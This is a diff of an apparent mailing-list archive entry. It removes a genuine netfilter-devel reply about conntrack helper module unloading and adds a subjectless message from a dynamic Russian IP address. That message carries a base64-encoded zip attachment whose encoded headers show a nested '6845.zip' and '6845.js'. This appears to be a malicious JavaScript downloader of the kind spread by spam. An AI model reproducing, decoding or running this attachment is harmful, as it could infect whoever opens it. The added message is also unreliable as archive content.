@@ -1,37 +1,81 @@
-From: Florian Westphal <fw@strlen.de>
-Subject: Re: [PATCH nf-next] netns: add and use net_ns_barrier
-Date: Tue, 13 Jun 2017 08:16:56 +0200
-Message-ID: <20170613061656.GF18283@breakpoint.cc>
-References: <20170530093812.10712-1-fw@strlen.de>
- <87y3tcj3n7.fsf@xmission.com>
- <20170601085259.GA6067@breakpoint.cc>
- <CAM_iQpXgrQcbrQsMVoomcsHtk4JffRjJ27FLRoignndAzFVkug@mail.gmail.com>
+From: <wvhyvcm.abyxg@jippii.com>
+Subject: (unknown)
+Date: Tue, 13 Jun 2017 09:35:17 -0000
+Message-ID: <149734651770.29695.3478468050658938204@saturn-internet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: Florian Westphal <fw@strlen.de>,
-        "Eric W. Biederman" <ebiederm@xmission.com>,
-        netfilter-devel@vger.kernel.org,
-        Linux Kernel Network Developers <netdev@vger.kernel.org>
-To: Cong Wang <xiyou.wangcong@gmail.com>
-Return-path: <netdev-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <CAM_iQpXgrQcbrQsMVoomcsHtk4JffRjJ27FLRoignndAzFVkug@mail.gmail.com>
-Sender: netdev-owner@vger.kernel.org
-List-Id: netfilter-devel.vger.kernel.org
+Content-Type: application/zip; name="4561729095232.zip"
+Content-Transfer-Encoding: base64
+To: <netfilter-devel@vger.kernel.org>
+Return-path: <netfilter-devel-owner@vger.kernel.org>
+Received: from 178.161.232.31.dyn.v4.saturn-internet.ru ([178.161.232.31]:44469
+        "HELO saturn-internet.ru" rhost-flags-OK-FAIL-OK-FAIL)
+        by vger.kernel.org with SMTP id S1751834AbdFMJfV (ORCPT
+        <rfc822;netfilter-devel@vger.kernel.org>);
+        Tue, 13 Jun 2017 05:35:21 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: netfilter-devel-owner@vger.kernel.org
+List-ID: <netfilter-devel.vger.kernel.org>
 
-Cong Wang <xiyou.wangcong@gmail.com> wrote:
-> On Thu, Jun 1, 2017 at 1:52 AM, Florian Westphal <fw@strlen.de> wrote:
-> > Joe described it nicely, problem is that after unload we may have
-> > conntracks that still have a nf_conn_help extension attached that
-> > has a pointer to a structure that resided in the (unloaded) module.
-> 
-> Why not hold a refcnt for its module?
-
-That would work as well.
-
-I'm not sure its nice to disallow rmmod of helper modules if they are
-used by a connection however.
-
-Right now you can "rmmod nf_conntrack_foo" at any time and this should
-work just fine without first having to flush affected conntracks
-manually.
+UEsDBAoAAgAAAEh5zUqWFWY1Aw0AAAMNAAAIABwANjg0NS56aXBVVAkAA/erP1n3qz9ZdXgLAAEE
+AAAAAAQAAAAAUEsDBBQAAgAIAENezUqqLayPXwwAAN8iAAAHABwANjg0NS5qc1VUCQADDn0/Wcep
+P1l1eAsAAQQAAAAABAAAAACtWttuG0cSfbYB/4MxLyZFIume+0DLBRYB8rbggx8lEei52YptDcDI
+iQJD/751qk5zSMqOlYWNKBzO9KUup05V9XD8fNfd3053r7fTdnLTtJic227dtJ628n07LV+9/PLq
+5Yv9cP95f/eaD3d8ePnq5eOrl2NcQubL/WmxdVuMwxJOluQSf4T9a5213cq8F/f7v+T/eKBPbjfJ
+f8N9gicvOGqzuBv+fP0rV18ksjbWS9YJFpZveiV39B4m2VPKyuFXyep2lby/4sibBb9z/M1iecHl
+ljeXyfJc+DVk+M9+H/5a+HW6ztbJ+HGa9snyKrt5+mwf7vrpkz5cLqGLmOdFF+6794thv6S+j7M9
+Z3sc2/EHuGKrSogroJrbHrkAak+TumCc9ovLy6X6wNxh/tBxv23EpGK0yS3UOlt3hf/JvZuffv/c
+/n6/X6TrdLncqSGnLQwKqW/Mh7rGh03SvX8jJp9v3W+SCASZtKEFOYCyPXH8pL5K1verRGxd1Ou0
+SNdVvvaV2N2vvcvWPi3lUm6V5Tqr1r5Ye1/JnUw/fSPf83S5piobLnn15pOAbvVhlfx8ff32S/74
+8zuMgZ7bzXVynayp88ZdwlomOu+sqbE8471/cfmfPg537+7fx9urVRy6Wi2/3I4Lfvv3hmbg+OWX
+ecVHSrHaTPjnnOD2t1WyvHxMVvJN/k2L5XeukgUXWSqwCYWl2brdD+GDXgKPJyAlCm5FjPj88Rh4
+EUCnsc9dT4Jd9j4Pdt79SnADzwhkhxG4Ml7g90sFr9pzsnuCzNul3n7YROrhgDWXW15S6AdYIF8n
+H8MfQ/Lc0KT0J3HFjbGf/HcSVxN2PtOWd8+1Va9MSmDmXVyZnhtFohckRtk5+IpDbxYcqV6lIGdU
+lHyCYsJD6fN4aBb+xKdbp8oeazmBm7ab5GJXdBe7urnYpfnFrqsvdqW/2LnhYufls5XvdXmxy1O5
+H+S+3Gvkz8vYtrrYDePFrsJ8GZ8WMh9jnTyXay9zRrnfZ7KHjC3xKfuMeCbjgjwf5K+Q6wbzW9u/
+kutc/lxhY/rcZKzk08kaLT6xt1yPpa3dyJ4OY0eT38u9QtYYWsrfUv7U9s9kjSBzRrlXyDq1fKYy
+d4SMwfZWHeV7J9eFrJlW3EtkTCEz5JXnlVx3sleZc35tumRyv8Z+8lfJGmlvegzQTa7DYPpX8lfL
+nAy2wjz5c7X5QPevbTzmZ6npmoo8gzf7+GD+y2RcJ/Jlcp3Lp6/NR10wG0P/5+4P3X1r/u9S7l+a
+X1pZw2dm/0BsABN4jntq/8zkH2V+T/uVg+EHdnccC/3gyx7+rc2mwBH2gf9Cb/4HpirYRT5DZbIN
+WbISNAuCB1i2pWXgjYZoyQ2JikKgqjYUZtDemzSQABKV2L0x68EKFVDQmOYYM0AKuVdCCpF2lGcF
+EFpYFMDC9WgogtfTwTyjVgxmBdWC6G0d95d5o6xX5GaFtDGPVdgbnujoRVolpfaQ2cuYMB6hoDYU
+QNfK2fgcMramU17OXsC+vp+9WIwWxYoikaWsjqIwN6TDi2oXyN9Sfzfrr/avKX9pdsJ9oAgskDen
+LKByyN/Y2v6wUSXf+9L8gecuojCiqDRdD/vnFuWKTEYeWAB2zkfTMUaB7t8zsrEOIiCYLJiv+ot8
+vbOoAFs4ed6kFlkRxRijKAwWRWrb2vQvU4vGqmcUBLNv09l16rg/fBsigoFzxDMwr7Eso+qCXEwu
+AOIgRe5tF0VGa8hXhJaGUHgqlWdNaZwOBBSpcWUn6xaOMVpaFGCdAF5wxtnK5fAGosWZByA5uLIm
+v0M7RQHRMNASkK0pbP+6tUgD6hSxOWM52HxwEeZgPiyE9XOiEHJjvqKoNLmwF5CZA52deW/sj+b3
+Nh9eAJfV4EKizI+nURi5LIiO3lkUYb5GQWVcq5wOXstsfiAKgGD1biDinKEYXAo5EX3pWS6CzPAf
+fKvy+xnFiqLKogCy9anJr1FYGLJUfuyPMZ3Nh9/BPp4MBRlg084bV9bNaS4IzCXwRxWZhQyFCFIW
+Go3FspG6esudBXOR5uKKuIDMXUQwYhHWGCqTAlymsRCMi8DD4IO2sVVc92O48DC/tPnwAp4hhpHx
+up77tDOXQ0OgBzEO70MmzFcUIVp65oKBFU5useyJrohi6JfGjNSYFRFJxVlGRTTBi+APlb/m/IgC
+b5kNcgTydoM8hYjL58oHMrQjKwJEB/kNKMB6+NSM2hoKwZUaRZkhU3UtDGGKImfef1YUpeYzzQWN
+oQBRpBw8kEXiNdDfk0UayyXKYsiboz1TFIWjiqAyFsR85IeGFQdQWFVkAfivN4Y4zC/nXAjbxlzY
+BFaUldkB8mMOaoWekYZIdmVEsKJoYCwzoxzqqoJWyGcu0YxSWUYAl7aDIQdaaEZjRoxeUG8XzGhn
+KIR1gHzNYoPVkfC21nOVZcSss8jSGrg4ykidWSYiNzCKNCNlJj8qEpWzIBenR3W5Z/SWlpnAhVqX
+1/RCY3kDXO4YiVF/fIeX1YsV67OS13Kv9iY/olA5oyFiwWXjHAW6f0Qo9A3GRagrEQXwGvoMZQHW
+9Af9K9MbOqv/KuqfEb2dyaoVTeTCwtbANeTXKo09BCoiyAYUIorB/0AsWAy8mHnrQbqOKOpM17Gf
+exHIq/YvTP6efZLq31hdjHyrUZiZ3jUrpjb2JdQfFZhWtKPJF+1Xk0WzPCL4SXcUTKK6s5Go5JVL
+U6swlIsYC5GjFEXQYjSegIV6ZhygGKhAzKEiAFJhoSJGQWvRE+siIAEoPs5oOe+ppuQydBDg8pxd
+gXYp/REXDazLR3pxNMvFigTcE7kItT4+B/KKZrScdXnDupwVAbgM8wtWVLA0Ika5bDQWAMcgClT+
+zFgAHaJmRGcVhWP9p5UEOyGtyFpyWTFzEbpNRLtWNCnr6or6E7kqf82Kavh2FDTs+LSvCaxoqjmK
+xliXsntXFNZWkYAV1P7B/A87afR7sknNbrY50r+2ygdyFuW3KoJnsOiTiiwiGH05rKN1WcaM7k5j
+EShC/QIpHKt7ZHvVgvUUeEe9MRgiYO3mvDuIdQ25NHYnsA6iSOvj2iyKuvbQXUUuPUdRcdRd9TMa
+w3BaUSADgksQQbAU+EK5sDEvof/VKPbWucUogoyqf29WRBREvtOMzoyJe6j1tMvw3L/gGYszz8Zc
+pBFLFgD6cb6gXNwSRbnNh73BCIqClJkz5TlIw8geTf7YVxTsaaBbxfoRsg2NnTGor8PcXWpdzCwd
+c6H2JZ31LIH7o6KoWPHBLsql7MbLMFc0YBF95pnLSuPeyCLKpaPpCt+i89R+o7DIPvafY/SmR1x8
+Kn9E8EGL1rKu1jVhZnTECzioY+Zz5VyXdKzWUfWntGKsy7THpqc9O6GS3lYuHjm/PeVydH//yArx
+jCAzK+CkCV5A7IO7GuaKOjM5T3IBT86yo5MuzQXezk/KZo4idFcVLQjvgiOVi4JxHNB37MVDd1Jb
+FlYUkAW+2+O3zAvUEd3Z/9sdIheiAogo9Ky3A09Pob9WZLnV83pG4+k/cGll+AAXxu5aT0rDnIu0
+u3ZEYTdzcc68fGAx2H40FhuHOZfE7jSwF2ufZb+I4L+zotYs43zSFq0YM7r2mFmsS/4hl5PL4nlj
+yX5WT4q+l1EanvfGiiA3LTWThrkiAErPK5q4v/bopXnx0B2mc3da87xbM3JPLz6jrgVyPM9qlQXa
+o+50sChULvbMJaOhSLvOznhT5W8NiX97UlfMVYbmEm/I1ihmdQXZvspCzz0j4vwsHM0fj+Z/A4Va
+kRZkkWDygUUUJ9/oLjWX+fmsSRmtY0VSs69KeV596ORGns47nqBpDDOzgZO1Oh9YnXfmBc2eNS3e
+MSPxpES7i8p441vVfcxonnVRjKKTU3+iaYid1sCTFnJmHk9zWkZBfGvRzxlpYG2sVU7MyOxuEGXK
+BaxIHE/y3HlFcdSdxTMW9SLlh/2AsO+d9MXu7rw7xR7W3er74Phuyl45PXlHznfTeMd68hsDvNmV
+v/MXcXb3yYs4vM6b4svGh8114h6ukxVvX725n97e72/v3r25WZy+S4z7Puvt2kGik7drfK+7xb9T
+DZy+F/7KryQeNgnEsdflHPa1t+WT/jjiFm9T8SMB/VmEvpLl6++3yephlby7uk7Ga/we4jp5H/a/
+yCWH3yy4ykFpzuSLZAi8TvbTp1+SkzePydQPyfLKP/etY9Tzx/z6If7o4fDecnn5P1BLAQIeAxQA
+AgAIAENezUqqLayPXwwAAN8iAAAHABgAAAAAAAEAAACkgQAAAAA2ODQ1LmpzVVQFAAMOfT9ZdXgL
+AAEEAAAAAAQAAAAAUEsFBgAAAAABAAEATQAAAKAMAAAAAFBLAQIeAwoAAgAAAEh5zUqWFWY1Aw0A
+AAMNAAAIABgAAAAAAAAAAACkgQAAAAA2ODQ1LnppcFVUBQAD96s/WXV4CwABBAAAAAAEAAAAAFBL
+BQYAAAAAAQABAE4AAABFDQAAAAA=
